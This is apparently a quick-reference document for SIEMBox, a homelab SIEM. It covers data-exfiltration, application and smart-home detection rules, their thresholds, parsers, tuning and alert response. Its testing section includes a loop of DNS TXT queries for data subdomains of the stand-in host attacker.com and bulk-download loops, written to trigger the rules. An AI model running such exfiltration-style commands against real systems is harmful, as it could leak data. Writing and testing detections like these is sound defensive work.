# Phase 3C Quick Reference: Detection Rules

**Implementation Date:** 2025-12-03
**Status:** ✅ COMPLETE
**Rules Added:** 9
**Total Project Rules:** 40 of 40 (100%)

---

## Phase 3C Rules Summary

### Data Exfiltration (3 Rules - HIGH Severity)

| Rule ID | File | Detection | Threshold |
|---------|------|-----------|-----------|
| **EXFIL-001** | `data-exfiltration/EXFIL-001-bulk-file-download.yaml` | Bulk file downloads (pdf/doc/xls/zip) | 100 files / 10m |
| **EXFIL-002** | `data-exfiltration/EXFIL-002-large-data-transfer.yaml` | Large file transfers (50MB+ each) | 100 files / 1h |
| **EXFIL-003** | `data-exfiltration/EXFIL-003-dns-tunneling.yaml` | DNS TXT queries (tunneling) | 50 queries / 5m |

**Required Parsers:** Nextcloud, Pi-hole DNS, Reverse Proxy (NGINX/Traefik/Caddy)

---

### Application-Specific (4 Rules - MEDIUM/HIGH/LOW)

| Rule ID | File | Severity | Detection | Threshold |
|---------|------|----------|-----------|-----------|
| **APP-001** | `application/APP-001-homeassistant-unauthorized-automation.yaml` | MEDIUM | Non-admin automation trigger | Single event |
| **APP-002** | `application/APP-002-unusual-media-streaming.yaml` | LOW | Excessive streaming | 600 streams / 24h |
| **APP-003** | `application/APP-003-pihole-dns-anomaly.yaml` | MEDIUM | High DNS query volume | 100 queries / 5m |
| **APP-004** | `application/APP-004-nextcloud-suspicious-file-access.yaml` | HIGH | Bulk Nextcloud file access | 20 accesses / 5m |

**Required Parsers:** Home Assistant, Pi-hole DNS, Nextcloud, Plex/Jellyfin (optional)

---

### IoT & Smart Home (2 Rules - MEDIUM/LOW)

| Rule ID | File | Severity | Detection | Threshold |
|---------|------|----------|-----------|-----------|
| **IOT-001** | `iot/IOT-001-unusual-automation-trigger.yaml` | MEDIUM | Non-scheduled late-night automation | Single event (1am-5am) |
| **IOT-002** | `iot/IOT-002-smart-lock-failures.yaml` | LOW | Repeated smart lock failures | 5 failures / 10m |

**Required Parsers:** Home Assistant (with device-specific events)

---

## Parser Requirements

### Nextcloud Parser (Phase 2)
```yaml
Required Fields:
  - client_ip: Source IP address
  - path: File path accessed
  - status_code: HTTP status (200 = success)
  - response_size: Bytes transferred
  - user: Nextcloud username
  - method: HTTP method (GET, POST, etc.)

Used By: EXFIL-001, EXFIL-002, APP-004
```

### Pi-hole DNS Parser (Phase 2)
```yaml
Required Fields:
  - client_ip: Source of DNS query
  - query_domain: Domain being queried
  - query_type: DNS record type (A, TXT, etc.)
  - status: Query result (blocked, forwarded, etc.)

Used By: EXFIL-003, APP-003
```

### Home Assistant Parser (Phase 2)
```yaml
Required Fields:
  - event_type: Type of event (automation_triggered, device_action)
  - user: User who triggered action
  - automation_name: Name of automation
  - trigger_type: How triggered (scheduled, manual, device)
  - device_type: Type of device (lock, camera, switch)
  - device_id: Unique device identifier
  - device_name: Human-readable device name
  - event: Event description (access_denied, access_granted)
  - client_ip: Source of action

Used By: APP-001, IOT-001, IOT-002
```

### Reverse Proxy Parsers (Phase 1)
```yaml
Required Fields:
  - client_ip: Source IP address
  - path: URL path accessed
  - status_code: HTTP status code
  - response_size: Bytes transferred
  - method: HTTP method
  - user_agent: Client user agent

Used By: EXFIL-001, EXFIL-002
```

---

## Deployment Checklist

### Pre-Deployment

- [ ] Verify Nextcloud parser extracting all required fields
- [ ] Verify Pi-hole parser extracting query_type correctly
- [ ] Verify Home Assistant parser supports device events
- [ ] Test parser output against rule conditions
- [ ] Review threshold values for your environment

### Deployment Steps

1. **Load Rules to Database**
   ```bash
   # Import via API
   curl -X POST http://siembox:3000/api/rules \
     -H "Content-Type: application/json" \
     -d @rules/data-exfiltration/EXFIL-001-bulk-file-download.yaml

   # Or use SIEMBox UI: Settings → Detection Rules → Import
   ```

2. **Enable Rules**
   ```yaml
   # Verify enabled: true in each YAML file
   enabled: true
   ```

3. **Verify Parser Priority**
   ```bash
   # Check parser order
   curl http://siembox:3000/api/parsers | jq '.[] | {name, priority}'
   ```

4. **Test Alert Generation**
   ```bash
   # Generate test logs for each rule
   # See testing section below
   ```

### Post-Deployment

- [ ] Monitor false positive rates (first 48 hours)
- [ ] Tune thresholds based on environment
- [ ] Document whitelist exclusions (IPs, users, devices)
- [ ] Create alert response playbooks
- [ ] Train users on alert meanings

---

## Testing Commands

### EXFIL-001: Bulk File Download
```bash
# Test with 110 PDF downloads
for i in {1..110}; do
  curl -s http://nextcloud.local/files/test${i}.pdf > /dev/null
  sleep 0.5
done

# Expected: Alert after ~5 minutes (100+ downloads in 10m window)
```

### EXFIL-002: Large Data Transfer
```bash
# Test with 110 large file requests
for i in {1..110}; do
  curl -s http://nextcloud.local/files/large-video${i}.mp4 > /dev/null
  sleep 30
done

# Expected: Alert after ~55 minutes (100+ 50MB+ files in 1h window)
```

### EXFIL-003: DNS Tunneling
```bash
# Test with 60 TXT queries
for i in {1..60}; do
  dig TXT data${i}.attacker.com @pihole.local +short
  sleep 1
done

# Expected: Alert after ~1 minute (50+ TXT queries in 5m window)
```

### APP-003: Pi-hole DNS Anomaly
```bash
# Test with 110 A record queries
for i in {1..110}; do
  dig A random${i}.example.com @pihole.local +short
  sleep 1
done

# Expected: Alert after ~2 minutes (100+ A queries in 5m window)
```

### APP-004: Nextcloud Suspicious File Access
```bash
# Test with 25 file accesses
for i in {1..25}; do
  curl -s http://nextcloud.local/files/document${i}.pdf > /dev/null
  sleep 5
done

# Expected: Alert after ~2 minutes (20+ accesses in 5m window)
```

### IOT-002: Smart Lock Failures
```bash
# Simulate 5 failed unlock attempts (manual testing via Home Assistant)
# 1. Open Home Assistant
# 2. Attempt to unlock smart lock with wrong code 5 times
# 3. Check SIEMBox alerts after 5th attempt

# Expected: Alert after 5th failed attempt
```

---

## Threshold Tuning Guide

### High False Positives?

**EXFIL-001: Bulk File Download**
- Increase threshold: 100 → 150 → 200 files
- Whitelist sync client user agents
- Exclude backup time windows

**EXFIL-002: Large Data Transfer**
- Increase threshold: 100 → 150 files
- Increase file size threshold: 50MB → 100MB
- Whitelist media server IPs

**EXFIL-003: DNS Tunneling**
- Increase threshold: 50 → 100 queries
- Whitelist mail server IPs (SPF/DKIM lookups)
- Exclude certificate validation processes

**APP-003: Pi-hole DNS Anomaly**
- Increase threshold: 100 → 200 → 500 queries
- Whitelist noisy IoT devices
- Adjust timeframe: 5m → 10m

**APP-004: Nextcloud Suspicious File Access**
- Increase threshold: 20 → 30 → 50 accesses
- Whitelist sync client user agents
- Exclude known backup IPs

**IOT-002: Smart Lock Failures**
- Increase threshold: 5 → 8 → 10 failures
- Track specific failure types (wrong code vs. connectivity)

### Missing Real Attacks?

**Lower Thresholds:**
- EXFIL-001: 100 → 50 files
- EXFIL-003: 50 → 30 TXT queries
- APP-003: 100 → 50 DNS queries
- APP-004: 20 → 10 accesses

**Shorten Timeframes:**
- 10m → 5m for EXFIL-001
- 5m → 3m for EXFIL-003, APP-003, APP-004

---

## Alert Response Guidance

### HIGH Severity Alerts

**EXFIL-001: Bulk File Download**
1. Identify user and files accessed
2. Calculate total data volume
3. Verify legitimate operation vs. theft
4. Check for compromised credentials
5. Consider rate limiting or session termination

**EXFIL-002: Large Data Transfer**
1. Review what data was transferred
2. Verify legitimate operation
3. Check for concurrent suspicious activity
4. Monitor for continued large transfers
5. Implement bandwidth throttling if needed

**EXFIL-003: DNS Tunneling**
1. Review DNS queries and target domains
2. Identify source system
3. Check for data encoding in subdomains
4. Block suspicious domains at Pi-hole
5. Investigate source system for compromise

**APP-004: Nextcloud Suspicious File Access**
1. Identify user and files accessed
2. Review if legitimate sync or scanning
3. Check for compromised credentials
4. Monitor for download/export operations
5. Consider rate limiting if abuse

### MEDIUM Severity Alerts

**APP-001: Home Assistant Unauthorized Automation**
1. Review automation changes made
2. Verify legitimate user action
3. Check if automation affects security devices
4. Revert unauthorized changes if needed

**APP-003: Pi-hole DNS Anomaly**
1. Identify source device
2. Review domains being queried
3. Check for malware C2 patterns
4. Consider device quarantine if malware suspected

**IOT-001: Unusual Automation Trigger**
1. Review automation details and trigger
2. Check for unauthorized Home Assistant access
3. Verify no physical security implications

### LOW Severity Alerts

**APP-002: Unusual Media Streaming**
1. Review user account and patterns
2. Check for concurrent streams from different IPs
3. Verify user hasn't shared credentials
4. Consider stream limits if excessive

**IOT-002: Smart Lock Failures**
1. Verify if legitimate user or breach attempt
2. Check physical lock status
3. Alert household occupants if suspicious
4. Review security camera footage if available

---

## Integration Notes

### Home Assistant Setup

**Required Configuration:**
1. Enable event logging in Home Assistant
2. Configure log forwarding to SIEMBox syslog
3. Ensure device events include failure states
4. Test automation trigger logging

**Log Forwarding:**
```yaml
# configuration.yaml
logger:
  default: info
  logs:
    homeassistant.core: debug
    homeassistant.components.automation: debug
    homeassistant.components.lock: debug
```

### Pi-hole Setup

**Required Configuration:**
1. Enable query logging in Pi-hole
2. Forward logs to SIEMBox syslog
3. Ensure query_type field is logged
4. Test DNS query logging

**Log Forwarding:**
```bash
# /etc/pihole/pihole-FTL.conf
QUERY_LOGGING=true

# Forward to SIEMBox
echo "*.* @siembox:514" >> /etc/rsyslog.d/10-pihole.conf
systemctl restart rsyslog
```

### Nextcloud Setup

**Required Configuration:**
1. Enable access logging in Nextcloud
2. Configure reverse proxy to log response_size
3. Forward logs to SIEMBox
4. Test file access logging

---

## Backend Feature Requirements

### Current Implementation
✅ Field-based conditions (equals, contains, regex, etc.)
✅ Aggregation by single field
✅ Count-based thresholds
✅ Time-based aggregation windows
✅ Variable substitution in alerts

### Enhancement Opportunities
🔧 **SUM Aggregation** (for EXFIL-002)
   - Current: Count of large files (proxy)
   - Desired: `SUM(response_size) >= 5368709120`
   - Benefit: Accurate data volume detection

🔧 **Distinct Count** (for DNS rules)
   - Current: Total query count
   - Desired: `DISTINCT_COUNT(query_domain) >= 50`
   - Benefit: Better DNS tunneling detection

🔧 **Multi-Field Aggregation**
   - Current: Single field grouping
   - Desired: Group by (client_ip, user)
   - Benefit: User-specific thresholds

🔧 **Time-of-Day Native Support**
   - Current: Regex on timestamp field
   - Desired: Native time window conditions
   - Benefit: More efficient filtering

---

## Success Metrics

### Detection Effectiveness
- **True Positive Rate:** Alerts on actual attacks
- **False Positive Rate:** Target <15% for MEDIUM/LOW, <5% for HIGH
- **Mean Time to Detect (MTTD):** <5 minutes for HIGH severity
- **Mean Time to Respond (MTTR):** <30 minutes for HIGH severity

### Monitoring Dashboards

**Alert Volume by Severity:**
```sql
SELECT severity, COUNT(*) as alert_count
FROM alerts
WHERE created_at >= NOW() - INTERVAL '24 hours'
GROUP BY severity
ORDER BY FIELD(severity, 'critical', 'high', 'medium', 'low');
```

**Top Triggered Rules:**
```sql
SELECT rule_name, COUNT(*) as trigger_count
FROM alerts
WHERE created_at >= NOW() - INTERVAL '7 days'
GROUP BY rule_name
ORDER BY trigger_count DESC
LIMIT 10;
```

**False Positive Rate:**
```sql
SELECT
  rule_name,
  COUNT(*) as total_alerts,
  SUM(CASE WHEN status = 'false_positive' THEN 1 ELSE 0 END) as false_positives,
  ROUND(SUM(CASE WHEN status = 'false_positive' THEN 1 ELSE 0 END) * 100.0 / COUNT(*), 2) as fp_rate
FROM alerts
WHERE created_at >= NOW() - INTERVAL '30 days'
GROUP BY rule_name
HAVING COUNT(*) >= 10
ORDER BY fp_rate DESC;
```

---

## Troubleshooting

### Rule Not Triggering

**Check Parser:**
```bash
# Verify parser is extracting required fields
curl http://siembox:3000/api/parsers | jq '.[] | select(.name=="Nextcloud")'

# Test parser with sample log
curl -X POST http://siembox:3000/api/parsers/test \
  -H "Content-Type: application/json" \
  -d '{"parser_type":"regex","pattern":"...","sample":"..."}'
```

**Check Rule Conditions:**
```sql
# Query parsed logs to see if conditions would match
SELECT * FROM parsed_logs
WHERE parsed_data->>'path' LIKE '%/files/%'
  AND parsed_data->>'status_code' = '200'
LIMIT 10;
```

**Verify Aggregation:**
```sql
# Check if threshold would be met
SELECT
  parsed_data->>'client_ip' as client_ip,
  COUNT(*) as event_count
FROM parsed_logs
WHERE timestamp >= NOW() - INTERVAL '5 minutes'
  AND parsed_data->>'path' LIKE '%/files/%'
GROUP BY parsed_data->>'client_ip'
HAVING COUNT(*) >= 20;
```

### High False Positives

1. Review triggered alerts for patterns
2. Identify common false positive sources
3. Add exclusion conditions or whitelist
4. Increase thresholds gradually
5. Document tuning decisions

### Performance Issues

**Optimize Queries:**
```sql
-- Add indexes for frequently queried JSONB fields
CREATE INDEX idx_parsed_logs_client_ip ON parsed_logs ((parsed_data->>'client_ip'));
CREATE INDEX idx_parsed_logs_path ON parsed_logs ((parsed_data->>'path'));
CREATE INDEX idx_parsed_logs_status ON parsed_logs ((parsed_data->>'status_code'));
```

**Implement Retention:**
```sql
-- Archive old logs
DELETE FROM parsed_logs WHERE timestamp < NOW() - INTERVAL '90 days';
```

---

## Files Reference

### Rule Files (Phase 3C)
```
rules/
├── data-exfiltration/
│   ├── EXFIL-001-bulk-file-download.yaml
│   ├── EXFIL-002-large-data-transfer.yaml
│   └── EXFIL-003-dns-tunneling.yaml
├── application/
│   ├── APP-001-homeassistant-unauthorized-automation.yaml
│   ├── APP-002-unusual-media-streaming.yaml
│   ├── APP-003-pihole-dns-anomaly.yaml
│   └── APP-004-nextcloud-suspicious-file-access.yaml
└── iot/
    ├── IOT-001-unusual-automation-trigger.yaml
    └── IOT-002-smart-lock-failures.yaml
```

### Documentation Files
```
PHASE-3C-IMPLEMENTATION-SUMMARY.md  - Detailed implementation guide
PHASE-3C-QUICK-REFERENCE.md         - This quick reference
HOMELAB-THREAT-MODEL.md             - Complete threat model (40 rules)
PARSER-RULE-IMPLEMENTATION-SPEC.md  - Technical standards
```

---

## Support and Feedback

**Issues:** https://github.com/cladkins/SIEMBOX/issues
**Discussions:** https://github.com/cladkins/SIEMBOX/discussions
**Documentation:** `/docs/` directory

---

**Last Updated:** 2025-12-03
**Phase Status:** ✅ COMPLETE (9/9 rules)
**Project Status:** 🎉 100% COMPLETE (40/40 rules)
